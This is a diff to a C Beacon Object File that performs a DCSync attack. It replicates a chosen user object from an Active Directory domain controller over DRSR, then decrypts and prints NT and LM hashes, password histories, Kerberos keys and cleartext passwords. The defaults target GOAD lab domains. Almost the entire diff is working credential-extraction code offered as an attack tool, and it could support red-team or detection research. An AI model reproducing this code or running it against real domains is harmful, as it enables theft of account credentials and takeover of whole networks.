@@ -12,6 +12,11 @@
 
 #include "drsr_defs.h"
 
+#ifndef BOF
+#undef internal_printf
+#define internal_printf(...) do { printf( __VA_ARGS__ ); fflush( stdout ); } while ( 0 )
+#endif
+
 /*  Security context structures for session key extraction  */
 typedef struct _SecHandle {
     ULONG_PTR dwLower;
@@ -189,15 +194,441 @@ typedef struct _CRYPTO_BUFFER
 } CRYPTO_BUFFER, *PCRYPTO_BUFFER;
 #endif
 
-/*  Helper function to decrypt password attributes using session key + RC4  */
-BOOL DecryptAttributeWithSessionKey( BYTE* pSessionKey, DWORD dwSessionKeyLen, BYTE* pEncryptedBlob, DWORD dwBlobLen, BYTE** ppDecryptedData, DWORD* pdwDecryptedLen )
+void PrintHexBytes( BYTE* pBytes, DWORD dwLen )
 {
-    if ( dwBlobLen < sizeof( ENCRYPTED_PAYLOAD ) )
+    for ( DWORD i = 0; i < dwLen; i++ )
+    {
+        internal_printf( "%02x", pBytes[i] );
+    }
+}
+
+void TransformDESKey( BYTE* pInputKey, BYTE* pOutputKey )
+{
+    pOutputKey[0] = ( pInputKey[0] >> 1 );
+    pOutputKey[1] = ( ( pInputKey[0] & 0x01 ) << 6 ) | ( pInputKey[1] >> 2 );
+    pOutputKey[2] = ( ( pInputKey[1] & 0x03 ) << 5 ) | ( pInputKey[2] >> 3 );
+    pOutputKey[3] = ( ( pInputKey[2] & 0x07 ) << 4 ) | ( pInputKey[3] >> 4 );
+    pOutputKey[4] = ( ( pInputKey[3] & 0x0f ) << 3 ) | ( pInputKey[4] >> 5 );
+    pOutputKey[5] = ( ( pInputKey[4] & 0x1f ) << 2 ) | ( pInputKey[5] >> 6 );
+    pOutputKey[6] = ( ( pInputKey[5] & 0x3f ) << 1 ) | ( pInputKey[6] >> 7 );
+    pOutputKey[7] = ( pInputKey[6] & 0x7f );
+
+    for ( DWORD i = 0; i < 8; i++ )
+    {
+        pOutputKey[i] = ( pOutputKey[i] << 1 ) & 0xfe;
+    }
+}
+
+void DeriveRidDESKeys( DWORD dwRid, BYTE key1[8], BYTE key2[8] )
+{
+    BYTE ridBytes[4];
+    BYTE rawKey1[7];
+    BYTE rawKey2[7];
+
+    ridBytes[0] = (BYTE)( dwRid & 0xff );
+    ridBytes[1] = (BYTE)( ( dwRid >> 8 ) & 0xff );
+    ridBytes[2] = (BYTE)( ( dwRid >> 16 ) & 0xff );
+    ridBytes[3] = (BYTE)( ( dwRid >> 24 ) & 0xff );
+
+    rawKey1[0] = ridBytes[0];
+    rawKey1[1] = ridBytes[1];
+    rawKey1[2] = ridBytes[2];
+    rawKey1[3] = ridBytes[3];
+    rawKey1[4] = ridBytes[0];
+    rawKey1[5] = ridBytes[1];
+    rawKey1[6] = ridBytes[2];
+
+    rawKey2[0] = ridBytes[3];
+    rawKey2[1] = ridBytes[0];
+    rawKey2[2] = ridBytes[1];
+    rawKey2[3] = ridBytes[2];
+    rawKey2[4] = ridBytes[3];
+    rawKey2[5] = ridBytes[0];
+    rawKey2[6] = ridBytes[1];
+
+    TransformDESKey( rawKey1, key1 );
+    TransformDESKey( rawKey2, key2 );
+}
+
+BOOL DecryptDESBlock( HCRYPTPROV hProv, BYTE key[8], BYTE encryptedBlock[8], BYTE decryptedBlock[8] )
+{
+    struct
+    {
+        BLOBHEADER header;
+        DWORD dwKeySize;
+        BYTE keyBytes[8];
+    } keyBlob;
+    HCRYPTKEY hKey = 0;
+    DWORD dwMode = CRYPT_MODE_ECB;
+    DWORD dwBlockLen = 8;
+    BOOL result = FALSE;
+
+    keyBlob.header.bType = PLAINTEXTKEYBLOB;
+    keyBlob.header.bVersion = CUR_BLOB_VERSION;
+    keyBlob.header.reserved = 0;
+    keyBlob.header.aiKeyAlg = CALG_DES;
+    keyBlob.dwKeySize = 8;
+    MSVCRT$memcpy( keyBlob.keyBytes, key, 8 );
+    MSVCRT$memcpy( decryptedBlock, encryptedBlock, 8 );
+
+    if ( !ADVAPI32$CryptImportKey( hProv, (BYTE*)&keyBlob, sizeof( keyBlob ), 0, 0, &hKey ) )
+    {
+        goto END;
+    }
+
+    ADVAPI32$CryptSetKeyParam( hKey, KP_MODE, (BYTE*)&dwMode, 0 );
+
+    if ( !ADVAPI32$CryptDecrypt( hKey, 0, FALSE, 0, decryptedBlock, &dwBlockLen ) || dwBlockLen != 8 )
+    {
+        goto END;
+    }
+
+    result = TRUE;
+
+END:
+    if ( hKey )
+    {
+        ADVAPI32$CryptDestroyKey( hKey );
+    }
+    return result;
+}
+
+BOOL RemoveRidDESLayer( BYTE* pEncryptedHash, DWORD dwEncryptedHashLen, DWORD dwRid, BYTE* pDecryptedHash )
+{
+    HCRYPTPROV hProv = 0;
+    BYTE key1[8];
+    BYTE key2[8];
+    BOOL result = FALSE;
+
+    if ( pEncryptedHash == NULL || pDecryptedHash == NULL || dwEncryptedHashLen < 16 )
     {
         return FALSE;
     }
 
-    PENCRYPTED_PAYLOAD pPayload = (PENCRYPTED_PAYLOAD)pEncryptedBlob;
+    if ( !ADVAPI32$CryptAcquireContextW( &hProv, NULL, NULL, PROV_RSA_FULL, CRYPT_VERIFYCONTEXT ) )
+    {
+        return FALSE;
+    }
+
+    DeriveRidDESKeys( dwRid, key1, key2 );
+
+    if ( !DecryptDESBlock( hProv, key1, pEncryptedHash, pDecryptedHash ) )
+    {
+        goto END;
+    }
+
+    if ( !DecryptDESBlock( hProv, key2, pEncryptedHash + 8, pDecryptedHash + 8 ) )
+    {
+        goto END;
+    }
+
+    result = TRUE;
+
+END:
+    ADVAPI32$CryptReleaseContext( hProv, 0 );
+    return result;
+}
+
+void PrintRidHashList( const char* label, BYTE* pData, DWORD dwDataLen, DWORD dwRid )
+{
+    BYTE hash[16];
+    DWORD count = dwDataLen / 16;
+
+    if ( dwRid == 0 )
+    {
+        internal_printf( "          [!] %s cannot be unwrapped without RID\n", label );
+        return;
+    }
+
+    if ( count == 0 )
+    {
+        internal_printf( "          [!] %s decrypted payload is too short (%u bytes)\n", label, dwDataLen );
+        return;
+    }
+
+    for ( DWORD i = 0; i < count; i++ )
+    {
+        if ( RemoveRidDESLayer( pData + ( i * 16 ), 16, dwRid, hash ) )
+        {
+            if ( count == 1 )
+            {
+                internal_printf( "          [*] %s: ", label );
+            }
+            else
+            {
+                internal_printf( "          [*] %s[%u]: ", label, i );
+            }
+            PrintHexBytes( hash, 16 );
+            internal_printf( "\n" );
+        }
+        else
+        {
+            internal_printf( "          [!] %s[%u] RID DES unwrap failed\n", label, i );
+        }
+    }
+}
+
+WORD ReadLe16( BYTE* p )
+{
+    return (WORD)( p[0] | ( p[1] << 8 ) );
+}
+
+DWORD ReadLe32( BYTE* p )
+{
+    return (DWORD)( p[0] | ( p[1] << 8 ) | ( p[2] << 16 ) | ( p[3] << 24 ) );
+}
+
+int HexNibble( BYTE c )
+{
+    if ( c >= '0' && c <= '9' )
+    {
+        return c - '0';
+    }
+    if ( c >= 'a' && c <= 'f' )
+    {
+        return c - 'a' + 10;
+    }
+    if ( c >= 'A' && c <= 'F' )
+    {
+        return c - 'A' + 10;
+    }
+    return -1;
+}
+
+BYTE* HexDecodeAlloc( BYTE* pHex, DWORD dwHexLen, DWORD* pdwOutLen )
+{
+    BYTE* pOut;
+    DWORD outLen;
+
+    if ( pHex == NULL || pdwOutLen == NULL || ( dwHexLen % 2 ) != 0 )
+    {
+        return NULL;
+    }
+
+    outLen = dwHexLen / 2;
+    pOut = (BYTE*)intAlloc( outLen );
+    if ( pOut == NULL )
+    {
+        return NULL;
+    }
+
+    for ( DWORD i = 0; i < outLen; i++ )
+    {
+        int hi = HexNibble( pHex[i * 2] );
+        int lo = HexNibble( pHex[( i * 2 ) + 1] );
+        if ( hi < 0 || lo < 0 )
+        {
+            intFree( pOut );
+            return NULL;
+        }
+        pOut[i] = (BYTE)( ( hi << 4 ) | lo );
+    }
+
+    *pdwOutLen = outLen;
+    return pOut;
+}
+
+BOOL SupplementalNameEquals( BYTE* pName, WORD wNameLen, const char* asciiName )
+{
+    DWORD charCount = wNameLen / sizeof( WCHAR );
+    DWORD asciiLen = (DWORD)MSVCRT$strlen( asciiName );
+
+    if ( charCount > 0 && pName[( charCount - 1 ) * sizeof( WCHAR )] == 0 &&
+         pName[( ( charCount - 1 ) * sizeof( WCHAR ) ) + 1] == 0 )
+    {
+        charCount--;
+    }
+
+    if ( charCount != asciiLen )
+    {
+        return FALSE;
+    }
+
+    for ( DWORD i = 0; i < asciiLen; i++ )
+    {
+        if ( pName[i * sizeof( WCHAR )] != (BYTE)asciiName[i] ||
+             pName[( i * sizeof( WCHAR ) ) + 1] != 0 )
+        {
+            return FALSE;
+        }
+    }
+
+    return TRUE;
+}
+
+const char* KerbKeyTypeName( DWORD keyType )
+{
+    switch ( keyType )
+    {
+        case 3:
+            return "des_cbc_md5";
+        case 17:
+            return "aes128_hmac";
+        case 18:
+            return "aes256_hmac";
+        case 23:
+            return "rc4_hmac";
+        default:
+            return "unknown";
+    }
+}
+
+void ParseKerberosNewerKeys( BYTE* pHexValue, DWORD dwHexValueLen )
+{
+    DWORD dwBlobLen = 0;
+    BYTE* pBlob = HexDecodeAlloc( pHexValue, dwHexValueLen, &dwBlobLen );
+    WORD credentialCount;
+    WORD saltLen;
+    DWORD saltOffset;
+    DWORD defaultIterations;
+    DWORD keyDataOffset = 24;
+
+    if ( pBlob == NULL )
+    {
+        internal_printf( "          [!] Kerberos-Newer-Keys hex decode failed\n" );
+        return;
+    }
+
+    if ( dwBlobLen < 24 )
+    {
+        internal_printf( "          [!] Kerberos-Newer-Keys blob too short (%u bytes)\n", dwBlobLen );
+        intFree( pBlob );
+        return;
+    }
+
+    credentialCount = ReadLe16( pBlob + 4 );
+    saltLen = ReadLe16( pBlob + 12 );
+    saltOffset = ReadLe32( pBlob + 16 );
+    defaultIterations = ReadLe32( pBlob + 20 );
+
+    if ( saltLen > 0 && saltOffset + saltLen <= dwBlobLen )
+    {
+        internal_printf( "          [*] Kerberos Salt: %.*S\n", saltLen / sizeof( WCHAR ), (WCHAR*)( pBlob + saltOffset ) );
+    }
+    if ( defaultIterations != 0 )
+    {
+        internal_printf( "          [*] Kerberos Iterations: %u\n", defaultIterations );
+    }
+
+    for ( WORD i = 0; i < credentialCount; i++ )
+    {
+        BYTE* pKeyData = pBlob + keyDataOffset + ( i * 24 );
+        DWORD iterationCount;
+        DWORD keyType;
+        DWORD keyLen;
+        DWORD keyOffset;
+
+        if ( keyDataOffset + ( ( i + 1 ) * 24 ) > dwBlobLen )
+        {
+            break;
+        }
+
+        iterationCount = ReadLe32( pKeyData + 8 );
+        keyType = ReadLe32( pKeyData + 12 );
+        keyLen = ReadLe32( pKeyData + 16 );
+        keyOffset = ReadLe32( pKeyData + 20 );
+
+        if ( keyLen > 0 && keyOffset + keyLen <= dwBlobLen )
+        {
+            internal_printf( "          [*] Kerberos %s", KerbKeyTypeName( keyType ) );
+            if ( iterationCount != 0 )
+            {
+                internal_printf( " (%u)", iterationCount );
+            }
+            internal_printf( ": " );
+            PrintHexBytes( pBlob + keyOffset, keyLen );
+            internal_printf( "\n" );
+        }
+    }
+
+    intFree( pBlob );
+}
+
+void ParseSupplementalCredentials( BYTE* pData, DWORD dwDataLen )
+{
+    DWORD propertiesEnd;
+    DWORD offset;
+    WORD propertyCount;
+
+    if ( pData == NULL || dwDataLen < 113 )
+    {
+        internal_printf( "          [!] Supplemental credentials blob too short (%u bytes)\n", dwDataLen );
+        return;
+    }
+
+    propertiesEnd = 12 + ReadLe32( pData + 4 );
+    if ( propertiesEnd > dwDataLen || propertiesEnd < 112 )
+    {
+        internal_printf( "          [!] Supplemental credentials length is invalid\n" );
+        return;
+    }
+
+    propertyCount = ReadLe16( pData + 110 );
+    offset = 112;
+
+    internal_printf( "          [*] Supplemental Properties: %u\n", propertyCount );
+
+    for ( WORD i = 0; i < propertyCount && offset + 6 <= propertiesEnd; i++ )
+    {
+        WORD nameLen = ReadLe16( pData + offset );
+        WORD valueLen = ReadLe16( pData + offset + 2 );
+        BYTE* pName = pData + offset + 6;
+        BYTE* pValue = pName + nameLen;
+
+        if ( offset + 6 + nameLen + valueLen > propertiesEnd )
+        {
+            internal_printf( "          [!] Supplemental property %u is truncated\n", i );
+            break;
+        }
+
+        internal_printf( "          [*] Supplemental Property: %.*S\n", nameLen / sizeof( WCHAR ), (WCHAR*)pName );
+
+        if ( SupplementalNameEquals( pName, nameLen, "Primary:Kerberos-Newer-Keys" ) )
+        {
+            ParseKerberosNewerKeys( pValue, valueLen );
+        }
+        else if ( SupplementalNameEquals( pName, nameLen, "Primary:CLEARTEXT" ) )
+        {
+            DWORD clearLen = 0;
+            BYTE* pClear = HexDecodeAlloc( pValue, valueLen, &clearLen );
+            if ( pClear != NULL )
+            {
+                internal_printf( "          [*] Cleartext: %.*S\n", clearLen / sizeof( WCHAR ), (WCHAR*)pClear );
+                intFree( pClear );
+            }
+        }
+
+        offset += 6 + nameLen + valueLen;
+    }
+}
+
+BOOL IsInterestingAttr( ATTRTYP attrTyp )
+{
+    return attrTyp == ATT_SAM_ACCOUNT_NAME ||
+           attrTyp == ATT_USER_PRINCIPAL_NAME ||
+           attrTyp == ATT_DBCS_PWD ||
+           attrTyp == ATT_UNICODE_PWD ||
+           attrTyp == ATT_SUPPLEMENTAL_CREDENTIALS ||
+           attrTyp == ATT_NT_PWD_HISTORY ||
+           attrTyp == ATT_LM_PWD_HISTORY ||
+           attrTyp == 0x00090092;
+}
+
+/*  Helper function to decrypt DRS secret attributes using session key + RC4.  */
+BOOL DecryptAttributeWithSessionKey( BYTE* pSessionKey, DWORD dwSessionKeyLen, BYTE* pEncryptedBlob, DWORD dwBlobLen, BYTE** ppDecryptedData, DWORD* pdwDecryptedLen )
+{
+    if ( pSessionKey == NULL || dwSessionKeyLen == 0 || pEncryptedBlob == NULL ||
+         ppDecryptedData == NULL || pdwDecryptedLen == NULL || dwBlobLen <= 20 )
+    {
+        return FALSE;
+    }
+
+    *ppDecryptedData = NULL;
+    *pdwDecryptedLen = 0;
+
+    BYTE* pSalt = pEncryptedBlob;
+    DWORD dwCipherLen = dwBlobLen - 16;
+    DWORD dwPlainLen = dwCipherLen - 4;
 
     /*  Derive MD5 hash of (SessionKey + Salt)  */
     HCRYPTPROV hProv = 0;
@@ -225,7 +656,7 @@ BOOL DecryptAttributeWithSessionKey( BYTE* pSessionKey, DWORD dwSessionKeyLen, B
     }
 
     /*  Hash salt  */
-    if ( !ADVAPI32$CryptHashData( hHash, pPayload->Salt, 16, 0 ) )
+    if ( !ADVAPI32$CryptHashData( hHash, pSalt, 16, 0 ) )
     {
         ADVAPI32$CryptDestroyHash( hHash );
         ADVAPI32$CryptReleaseContext( hProv, 0 );
@@ -243,26 +674,31 @@ BOOL DecryptAttributeWithSessionKey( BYTE* pSessionKey, DWORD dwSessionKeyLen, B
     ADVAPI32$CryptDestroyHash( hHash );
     ADVAPI32$CryptReleaseContext( hProv, 0 );
 
-    /*  Calculate encrypted data length  */
-    DWORD dwEncryptedDataLen = dwBlobLen - sizeof( ENCRYPTED_PAYLOAD ) + 1;
-
-    /*  Allocate buffer for decrypted data  */
-    BYTE* pDecrypted = (BYTE*)intAlloc( dwEncryptedDataLen );
-    if ( !pDecrypted )
+    BYTE* pCipher = (BYTE*)intAlloc( dwCipherLen );
+    BYTE* pDecrypted = (BYTE*)intAlloc( dwPlainLen );
+    if ( !pCipher || !pDecrypted )
     {
+        if ( pCipher )
+        {
+            intFree( pCipher );
+        }
+        if ( pDecrypted )
+        {
+            intFree( pDecrypted );
+        }
         return FALSE;
     }
 
-    /*  Copy encrypted data  */
-    MSVCRT$memcpy( pDecrypted, pPayload->EncryptedData, dwEncryptedDataLen );
+    /*  The encrypted range is Checksum || Data; Salt is the only cleartext field.  */
+    MSVCRT$memcpy( pCipher, pEncryptedBlob + 16, dwCipherLen );
 
     /*  Decrypt using RC4 (SystemFunction032)  */
     CRYPTO_BUFFER dataBuffer;
     CRYPTO_BUFFER keyBuffer;
 
-    dataBuffer.Length = dwEncryptedDataLen;
-    dataBuffer.MaximumLength = dwEncryptedDataLen;
-    dataBuffer.Buffer = pDecrypted;
+    dataBuffer.Length = dwCipherLen;
+    dataBuffer.MaximumLength = dwCipherLen;
+    dataBuffer.Buffer = pCipher;
 
     keyBuffer.Length = 16;
     keyBuffer.MaximumLength = 16;
@@ -273,6 +709,7 @@ BOOL DecryptAttributeWithSessionKey( BYTE* pSessionKey, DWORD dwSessionKeyLen, B
     HMODULE hAdvapi = LoadLibraryA( "advapi32.dll" );
     if ( !hAdvapi )
     {
+        intFree( pCipher );
         intFree( pDecrypted );
         return FALSE;
     }
@@ -281,6 +718,7 @@ BOOL DecryptAttributeWithSessionKey( BYTE* pSessionKey, DWORD dwSessionKeyLen, B
     if ( !pSystemFunction032 )
     {
         FreeLibrary( hAdvapi );
+        intFree( pCipher );
         intFree( pDecrypted );
         return FALSE;
     }
@@ -293,14 +731,17 @@ BOOL DecryptAttributeWithSessionKey( BYTE* pSessionKey, DWORD dwSessionKeyLen, B
 
     if ( status != 0 )
     {
+        intFree( pCipher );
         intFree( pDecrypted );
         return FALSE;
     }
 
-    /*  TODO: Verify CRC32 checksum at pPayload->Checksum  */
+    /*  The first decrypted DWORD is the DRS checksum.  */
+    MSVCRT$memcpy( pDecrypted, pCipher + 4, dwPlainLen );
+    intFree( pCipher );
 
     *ppDecryptedData = pDecrypted;
-    *pdwDecryptedLen = dwEncryptedDataLen;
+    *pdwDecryptedLen = dwPlainLen;
 
     return TRUE;
 }
@@ -325,9 +766,7 @@ void execute( LPWSTR userDN, LPWSTR domainDN, LPWSTR domainController )
     DRS_MSG_GETCHGREQ getChReq = { 0 };
     DRS_EXTENSIONS* pDrsExtensionsOutput = NULL;
     DRS_HANDLE drsHandle = NULL;
-    DSNAME* pNamingContext = NULL;
     DSNAME* pUserDsName = NULL;
-    PARTIAL_ATTR_VECTOR_V1_EXT* pPartialAttrSet = NULL;
 
     /*  Allocate and setup DRS extensions  */
     DRS_EXTENSIONS_INT* pDrsExtensionsInt = (DRS_EXTENSIONS_INT*)intAlloc( sizeof( DRS_EXTENSIONS_INT ) );
@@ -338,7 +777,8 @@ void execute( LPWSTR userDN, LPWSTR domainDN, LPWSTR domainController )
     }
 
     pDrsExtensionsInt->cb = sizeof( DRS_EXTENSIONS_INT ) - sizeof( DWORD );
-    pDrsExtensionsInt->dwFlags = DRS_EXT_GETCHGREPLY_V6 | DRS_EXT_STRONG_ENCRYPTION;
+    pDrsExtensionsInt->dwFlags = DRS_EXT_GETCHGREQ_V6 | DRS_EXT_GETCHGREPLY_V6 |
+        DRS_EXT_GETCHGREQ_V8 | DRS_EXT_STRONG_ENCRYPTION | DRS_EXT_NONDOMAIN_NCS;
 
     internal_printf( "[*] Calling IDL_DRSBind...\n" );
 
@@ -394,14 +834,6 @@ void execute( LPWSTR userDN, LPWSTR domainDN, LPWSTR domainController )
                 internal_printf( "[*] Copied dwExtCaps: 0x%08x\n", pServerExt->dwExtCaps );
             }
 
-            /*  Create DSNAME for naming context  */
-            pNamingContext = CreateDsName( domainDN );
-            if ( pNamingContext == NULL )
-            {
-                internal_printf( "[!] Failed to create naming context DSNAME\n" );
-                goto END;
-            }
-
             /*  Create DSNAME for user  */
             pUserDsName = CreateDsName( userDN );
             if ( pUserDsName == NULL )
@@ -410,33 +842,15 @@ void execute( LPWSTR userDN, LPWSTR domainDN, LPWSTR domainController )
                 goto END;
             }
 
-            /*  Create partial attribute vector to request password attributes  */
-            pPartialAttrSet = (PARTIAL_ATTR_VECTOR_V1_EXT*)intAlloc(
-                sizeof( PARTIAL_ATTR_VECTOR_V1_EXT ) + ( 4 * sizeof( ATTRTYP ) )
-            );
-            if ( pPartialAttrSet == NULL )
-            {
-                internal_printf( "[!] Failed to allocate partial attribute set\n" );
-                goto END;
-            }
-
-            pPartialAttrSet->dwVersion = 1;
-            pPartialAttrSet->dwReserved1 = 0;
-            pPartialAttrSet->cAttrs = 5;
-            pPartialAttrSet->rgPartialAttr[0] = ATT_UNICODE_PWD;
-            pPartialAttrSet->rgPartialAttr[1] = ATT_SUPPLEMENTAL_CREDENTIALS;
-            pPartialAttrSet->rgPartialAttr[2] = ATT_NT_PWD_HISTORY;
-            pPartialAttrSet->rgPartialAttr[3] = ATT_LM_PWD_HISTORY;
-            pPartialAttrSet->rgPartialAttr[4] = 0x00090092;  /*  objectSid  */
-
             /*  Setup GetNCChanges request  */
-            /*  For EXOP_REPL_OBJ: pNC = user object, use partial attr set for password attrs  */
+            /*  Request all attributes for this one object; the partial set caused
+                supplementalCredentials to be omitted on Server 2019 in GOAD.  */
             getChReq.V8.pNC = pUserDsName;
-            getChReq.V8.ulFlags = DRS_INIT_SYNC | DRS_WRIT_REP | DRS_NEVER_SYNCED;
-            getChReq.V8.cMaxObjects = 1000;
-            getChReq.V8.cMaxBytes = 0x00a00000;
+            getChReq.V8.ulFlags = DRS_INIT_SYNC | DRS_WRIT_REP;
+            getChReq.V8.cMaxObjects = 1;
+            getChReq.V8.cMaxBytes = 0;
             getChReq.V8.ulExtendedOp = EXOP_REPL_OBJ;
-            getChReq.V8.pPartialAttrSet = pPartialAttrSet;
+            getChReq.V8.pPartialAttrSet = NULL;
 
             /*  Verify session key was extracted by the security callback  */
             if ( g_pSessionKey == NULL || g_dwSessionKeyLen == 0 )
@@ -484,6 +898,13 @@ void execute( LPWSTR userDN, LPWSTR domainDN, LPWSTR domainController )
                             /*  Iterate through attributes  */
                             ATTRBLOCK* pAttrBlock = &pCurrent->Entinf.AttrBlock;
                             internal_printf( "    Attributes: %u\n", pAttrBlock->attrCount );
+                            if ( pAttrBlock->attrCount > 0 && pAttrBlock->pAttr == NULL )
+                            {
+                                internal_printf( "    [!] Attribute pointer is NULL\n" );
+                                pCurrent = pCurrent->pNextEntInf;
+                                objIndex++;
+                                continue;
+                            }
 
                             /*  Extract RID - check objectSid first, fallback to pName->Sid  */
                             DWORD dwRID = 0;
@@ -492,10 +913,11 @@ void execute( LPWSTR userDN, LPWSTR domainDN, LPWSTR domainController )
                             for ( ULONG ridIdx = 0; ridIdx < pAttrBlock->attrCount; ridIdx++ )
                             {
                                 if ( pAttrBlock->pAttr[ridIdx].attrTyp == 0x00090092 &&
-                                     pAttrBlock->pAttr[ridIdx].AttrVal.valCount > 0 )
+                                     pAttrBlock->pAttr[ridIdx].AttrVal.valCount > 0 &&
+                                     pAttrBlock->pAttr[ridIdx].AttrVal.pAVal != NULL )
                                 {
                                     ATTRVAL* pSidVal = &pAttrBlock->pAttr[ridIdx].AttrVal.pAVal[0];
-                                    if ( pSidVal->valLen >= 12 )
+                                    if ( pSidVal->valLen >= 12 && pSidVal->pVal != NULL )
                                     {
                                         /*  RID is the last 4 bytes of the SID  */
                                         dwRID = *(DWORD*)( pSidVal->pVal + pSidVal->valLen - 4 );
@@ -524,8 +946,19 @@ void execute( LPWSTR userDN, LPWSTR domainDN, LPWSTR domainController )
                             for ( ULONG i = 0; i < pAttrBlock->attrCount; i++ )
                             {
                                 ATTR* pAttr = &pAttrBlock->pAttr[i];
+                                if ( !IsInterestingAttr( pAttr->attrTyp ) )
+                                {
+                                    continue;
+                                }
+
                                 internal_printf( "      [%u] attrTyp: 0x%08x, values: %u\n",
                                     i, pAttr->attrTyp, pAttr->AttrVal.valCount );
+
+                                if ( pAttr->AttrVal.valCount > 0 && pAttr->AttrVal.pAVal == NULL )
+                                {
+                                    internal_printf( "          [!] Attribute value pointer is NULL\n" );
+                                    continue;
+                                }
 
                                 /*  Process attribute values  */
                                 for ( ULONG j = 0; j < pAttr->AttrVal.valCount; j++ )
@@ -533,11 +966,23 @@ void execute( LPWSTR userDN, LPWSTR domainDN, LPWSTR domainController )
                                     ATTRVAL* pVal = &pAttr->AttrVal.pAVal[j];
                                     internal_printf( "          Value %u: %u bytes\n", j, pVal->valLen );
 
+                                    if ( ( pAttr->attrTyp == ATT_SAM_ACCOUNT_NAME ||
+                                           pAttr->attrTyp == ATT_USER_PRINCIPAL_NAME ) &&
+                                         pVal->valLen > 0 && pVal->pVal != NULL )
+                                    {
+                                        internal_printf( "          [*] %s: %.*S\n",
+                                            pAttr->attrTyp == ATT_SAM_ACCOUNT_NAME ? "sAMAccountName" : "userPrincipalName",
+                                            pVal->valLen / sizeof( WCHAR ),
+                                            (WCHAR*)pVal->pVal );
+                                    }
+
                                     /*  Decrypt password attributes  */
-                                    if ( ( pAttr->attrTyp == ATT_UNICODE_PWD ||
+                                    if ( ( pAttr->attrTyp == ATT_DBCS_PWD ||
+                                           pAttr->attrTyp == ATT_UNICODE_PWD ||
                                            pAttr->attrTyp == ATT_SUPPLEMENTAL_CREDENTIALS ||
                                            pAttr->attrTyp == ATT_NT_PWD_HISTORY ||
                                            pAttr->attrTyp == ATT_LM_PWD_HISTORY ) &&
+                                         pVal->valLen > 0 && pVal->pVal != NULL &&
                                          g_pSessionKey != NULL )
                                     {
                                         BYTE* pDecrypted = NULL;
@@ -545,26 +990,26 @@ void execute( LPWSTR userDN, LPWSTR domainDN, LPWSTR domainController )
 
                                         if ( DecryptAttributeWithSessionKey( g_pSessionKey, g_dwSessionKeyLen, pVal->pVal, pVal->valLen, &pDecrypted, &dwDecryptedLen ) )
                                         {
-                                            if ( pAttr->attrTyp == ATT_UNICODE_PWD && dwDecryptedLen >= 16 )
+                                            if ( pAttr->attrTyp == ATT_DBCS_PWD )
                                             {
-                                                internal_printf( "          [*] NT Hash: " );
-                                                for ( ULONG k = 0; k < 16; k++ )
-                                                {
-                                                    internal_printf( "%02x", pDecrypted[k] );
-                                                }
-                                                internal_printf( "\n" );
+                                                PrintRidHashList( "LM Hash", pDecrypted, dwDecryptedLen, dwRID );
+                                            }
+                                            else if ( pAttr->attrTyp == ATT_UNICODE_PWD )
+                                            {
+                                                PrintRidHashList( "NT Hash", pDecrypted, dwDecryptedLen, dwRID );
                                             }
                                             else if ( pAttr->attrTyp == ATT_SUPPLEMENTAL_CREDENTIALS )
                                             {
                                                 internal_printf( "          [*] Supplemental Credentials decrypted (%u bytes)\n", dwDecryptedLen );
+                                                ParseSupplementalCredentials( pDecrypted, dwDecryptedLen );
                                             }
                                             else if ( pAttr->attrTyp == ATT_NT_PWD_HISTORY )
                                             {
-                                                internal_printf( "          [*] NT Password History decrypted (%u bytes)\n", dwDecryptedLen );
+                                                PrintRidHashList( "NT History", pDecrypted, dwDecryptedLen, dwRID );
                                             }
                                             else if ( pAttr->attrTyp == ATT_LM_PWD_HISTORY )
                                             {
-                                                internal_printf( "          [*] LM Password History decrypted (%u bytes)\n", dwDecryptedLen );
+                                                PrintRidHashList( "LM History", pDecrypted, dwDecryptedLen, dwRID );
                                             }
 
                                             intFree( pDecrypted );
@@ -575,6 +1020,7 @@ void execute( LPWSTR userDN, LPWSTR domainDN, LPWSTR domainController )
                                         }
                                     }
 
+#ifdef DCSYNC_DEBUG
                                     /*  Print hex dump of encrypted data  */
                                     if ( pVal->valLen > 0 && pVal->pVal != NULL )
                                     {
@@ -594,6 +1040,7 @@ void execute( LPWSTR userDN, LPWSTR domainDN, LPWSTR domainController )
                                         }
                                         internal_printf( "\n" );
                                     }
+#endif
                                 }
                             }
 
@@ -635,11 +1082,6 @@ END:
         IDL_DRSUnbind( &drsHandle );
     }
 
-    if ( pNamingContext )
-    {
-        intFree( pNamingContext );
-    }
-
     if ( pUserDsName )
     {
         intFree( pUserDsName );
@@ -648,11 +1090,6 @@ END:
     if ( pDrsExtensionsInt )
     {
         intFree( pDrsExtensionsInt );
-    }
-
-    if ( pPartialAttrSet )
-    {
-        intFree( pPartialAttrSet );
     }
 
     if ( g_pSessionKey )
@@ -695,18 +1132,94 @@ VOID go(
     if ( userDN == NULL || domainDN == NULL || domainController == NULL )
     {
         internal_printf( "[!] userDN, domainDN, and domainController must be specified" );
+        printoutput( TRUE );
         return;
     }
 
-    // call execute with args
     execute( userDN, domainDN, domainController );
 
     printoutput( TRUE );
 };
 #else
-int main()
+static LPWSTR ArgToWide( const char* arg )
 {
-    execute( L"CN=jaime.lannister,OU=Crownlands,DC=sevenkingdoms,DC=local", L"DC=sevenkingdoms,DC=local", L"kingslanding.sevenkingdoms.local" );
+    int wideLen = MultiByteToWideChar( CP_UTF8, 0, arg, -1, NULL, 0 );
+    LPWSTR wideArg = NULL;
+
+    if ( wideLen == 0 )
+    {
+        wideLen = MultiByteToWideChar( CP_ACP, 0, arg, -1, NULL, 0 );
+    }
+
+    if ( wideLen == 0 )
+    {
+        return NULL;
+    }
+
+    wideArg = (LPWSTR)intAlloc( wideLen * sizeof( WCHAR ) );
+    if ( wideArg == NULL )
+    {
+        return NULL;
+    }
+
+    if ( MultiByteToWideChar( CP_UTF8, 0, arg, -1, wideArg, wideLen ) == 0 &&
+         MultiByteToWideChar( CP_ACP, 0, arg, -1, wideArg, wideLen ) == 0 )
+    {
+        intFree( wideArg );
+        return NULL;
+    }
+
+    return wideArg;
+}
+
+int main( int argc, char** argv )
+{
+    LPWSTR userDN = NULL;
+    LPWSTR domainDN = NULL;
+    LPWSTR domainController = NULL;
+
+    setvbuf( stdout, NULL, _IONBF, 0 );
+
+    if ( argc == 4 )
+    {
+        userDN = ArgToWide( argv[1] );
+        domainDN = ArgToWide( argv[2] );
+        domainController = ArgToWide( argv[3] );
+
+        if ( userDN == NULL || domainDN == NULL || domainController == NULL )
+        {
+            internal_printf( "[!] Failed to convert command line arguments\n" );
+            goto END;
+        }
+    }
+    else
+    {
+        internal_printf( "[*] Usage: %s <targetDN> <domainDN> <domainController>\n", argv[0] );
+        internal_printf( "[*] Using NORTH lab defaults\n" );
+        userDN = L"CN=eddard.stark,CN=Users,DC=north,DC=sevenkingdoms,DC=local";
